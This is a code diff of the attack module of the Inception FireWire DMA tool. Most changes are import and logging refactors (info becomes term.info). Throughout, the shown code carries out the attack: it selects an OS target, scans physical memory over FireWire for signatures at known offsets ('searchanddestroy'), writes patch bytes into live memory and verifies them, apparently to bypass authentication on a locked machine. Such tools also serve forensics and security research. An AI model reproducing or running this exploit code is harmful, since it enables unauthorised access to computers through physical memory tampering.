@@ -21,10 +21,7 @@ Created on Jun 23, 2011
 
 @author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy <n@tropy.org>
 '''
-from inception import sound
-from inception.firewire import FireWire, cfg
-from inception.util import info, MemoryFile, fail, bytelen, int2binhex, \
-    separator, bytes2hexstr, warn, poll, ProgressBar
+from inception import firewire, cfg, sound, util, term
 import os
 import sys
 import time
@@ -35,10 +32,10 @@ def select_target(targets, selected=False):
     Provides easy selection of targets. Input is a list of targets (dicts)
     '''
     if len(targets) == 1:
-        info('Only one target present, auto-selected')
+        term.info('Only one target present, auto-selected')
         return targets[0]
     if not selected:
-        poll('Please select target (or enter \'q\' to quit):')
+        term.poll('Please select target (or enter \'q\' to quit):')
         selected = input()
     nof_targets = len(targets)
     try:
@@ -46,13 +43,13 @@ def select_target(targets, selected=False):
     except:
         if selected == 'q': sys.exit()
         else:
-            warn('Invalid selection, please try again. Type \'q\' to quit')
+            term.warn('Invalid selection, please try again. Type \'q\' to quit')
             return select_target(targets)
     if 0 < selected <= nof_targets:
         return targets[selected - 1]
     else:
-        warn('Please enter a selection between 1 and ' + str(nof_targets) + 
-             '. Type \'q\' to quit')
+        term.warn('Please enter a selection between 1 and ' + str(nof_targets) + 
+                  '. Type \'q\' to quit')
         return select_target(targets)
     
 
@@ -60,8 +57,8 @@ def printdetails(target): # TODO: Fix this fugly method
     '''
     Prints details about a target
     '''
-    info('The target module contains the following signatures:')
-    separator()
+    term.info('The target module contains the following signatures:')
+    term.separator()
     print('\tVersions:\t' + ', '.join(target['versions']).rstrip(', '))
     print('\tArchitectures:\t' + ', '
           .join(target['architectures']).rstrip(', '))
@@ -76,7 +73,7 @@ def printdetails(target): # TODO: Fix this fugly method
         patch = 0
         poffs = 0
         for chunk in signature['chunks']:
-            diff = chunk['internaloffset'] - bytelen(chunk['chunk']) - 1 - ioffs
+            diff = chunk['internaloffset'] - util.bytelen(chunk['chunk']) - 1 - ioffs
             sig += '__' * diff
             ioffs = chunk['internaloffset']
             sig += '{0:x}'.format(chunk['chunk'])
@@ -88,18 +85,18 @@ def printdetails(target): # TODO: Fix this fugly method
         print('\t\tPatch:\t\t{0:#x}'.format(patch))
         print('\t\tPatch offset:\t{0:#x}'.format(poffs))
         
-    separator()
+    term.separator()
     
     
 def list_targets(targets, details=False):
-    info('Available targets:')
-    separator()
+    term.info('Available targets:')
+    term.separator()
     for number, target in enumerate(targets, 1):
-                info(target['OS'] + ': ' + target['name'], sign = number)
+                term.info(target['OS'] + ': ' + target['name'], sign = number)
                 if details:
                     printdetails(target)
     if not details: # Avoid duplicate separator
-        separator()
+        term.separator()
     
 
 def siglen(l):
@@ -113,7 +110,7 @@ def siglen(l):
             value = l[i]['internaloffset']
             index = i
     # Must decrement bytelen with one since byte positions start at zero
-    return bytelen(l[index]['chunk']) - 1 + value
+    return util.bytelen(l[index]['chunk']) - 1 + value
 
 
 def match(candidate, chunks):
@@ -146,7 +143,7 @@ def patch(device, address, chunks):
             device.write(realaddress, patch)
             read = device.read(realaddress, len(patch))
             if cfg.verbose:
-                info('Data read back: ' + bytes2hexstr(read))
+                term.info('Data read back: ' + util.bytes2hexstr(read))
             if  read != patch:
                 success = False
     return success
@@ -165,15 +162,15 @@ def searchanddestroy(device, target, memsize):
         signature['length'] = siglen(signature['chunks'])
         offsets = signature['offsets'] # Offsets within pages
         for chunk in signature['chunks']:
-            chunk['chunk'] = int2binhex(chunk['chunk'])
+            chunk['chunk'] = util.int2binhex(chunk['chunk'])
             try:
-                chunk['patch'] = int2binhex(chunk['patch'])
+                chunk['patch'] = util.int2binhex(chunk['patch'])
             except KeyError:
                 chunk['patch'] = None
     
     # Progress bar
-    prog = ProgressBar(max_value = memsize, total_width = cfg.termwidth, 
-                       print_data = cfg.verbose)
+    prog = term.ProgressBar(max_value = memsize, total_width = cfg.termwidth, 
+                            print_data = cfg.verbose)
 
     try:
         # Build a batch of read requests of the form: [(addr1, len1), ...] and
@@ -229,10 +226,11 @@ def searchanddestroy(device, target, memsize):
             
     except IOError:
         print()
-        fail('I/O Error, make sure FireWire interfaces are properly connected')
+        term.fail('I/O Error, make sure FireWire interfaces are properly ' +
+                  'connected')
     except KeyboardInterrupt:
         print()
-        fail('Aborted')
+        term.fail('Aborted')
         raise KeyboardInterrupt
     
     # If we get here, we haven't found anything :-/
@@ -247,14 +245,14 @@ def attack(targets):
     # Initialize and lower DMA shield
     if not cfg.filemode:
         try:
-            fw = FireWire()
+            fw = firewire.FireWire()
         except IOError:
-            fail('Could not initialize FireWire. Are the modules loaded into ' +
-                 'the kernel?')
+            term.fail('Could not initialize FireWire. Are the modules ' +
+                      'loaded into the kernel?')
         start = time.time()
         device_index = fw.select_device()
         # Print selection
-        info('Selected device: {0}'.format(fw.vendors[device_index]))
+        term.info('Selected device: {0}'.format(fw.vendors[device_index]))
 
     # List targets
     list_targets(targets)
@@ -263,7 +261,7 @@ def attack(targets):
     target = select_target(targets)
     
     # Print selection. If verbose, print selection with signatures
-    info('Selected target: ' + target['OS'] + ': ' + target['name'])
+    term.info('Selected target: ' + target['OS'] + ': ' + target['name'])
     if cfg.verbose:
         printdetails(target)
     
@@ -271,7 +269,7 @@ def attack(targets):
     device = None
     memsize = None
     if cfg.filemode:
-        device = MemoryFile(cfg.filename, cfg.PAGESIZE)
+        device = util.MemoryFile(cfg.filename, cfg.PAGESIZE)
         memsize = os.path.getsize(cfg.filename)
     else:
         elapsed = int(time.time() - start)
@@ -280,7 +278,7 @@ def attack(targets):
     
     # Perform parallel search for all signatures for each OS at the known 
     # offsets
-    info('DMA shields should be down by now. Attacking...')
+    term.info('DMA shields should be down by now. Attacking...')
     address, chunks = searchanddestroy(device, target, memsize)
     if not address:
         # TODO: Fall-back sequential search?
@@ -289,17 +287,17 @@ def attack(targets):
     # Signature found, let's patch
     mask = 0xfffff000 # Mask away the lower bits to find the page number
     page = int((address & mask) / cfg.PAGESIZE)
-    info('Signature found at {0:#x} (in page # {1})'.format(address, page))
+    term.info('Signature found at {0:#x} (in page # {1})'.format(address, page))
     if not cfg.dry_run:
         success = patch(device, address, chunks)
         if success:
-            info('Write-back verified; patching successful')
+            term.info('Write-back verified; patching successful')
             if cfg.egg:
                 sound.play('data/inception.wav')
-            info('BRRRRRRRAAAAAWWWWRWRRRMRMRMMRMRMMMMM!!!')
+            term.info('BRRRRRRRAAAAAWWWWRWRRRMRMRMMRMRMMMMM!!!')
         else:
-            warn('Write-back could not be verified; patching *may* have been ' +
-                 'unsuccessful')
+            term.warn('Write-back could not be verified; patching *may* ' +
+                      'have been unsuccessful')
     
     #Clean up
     device.close()
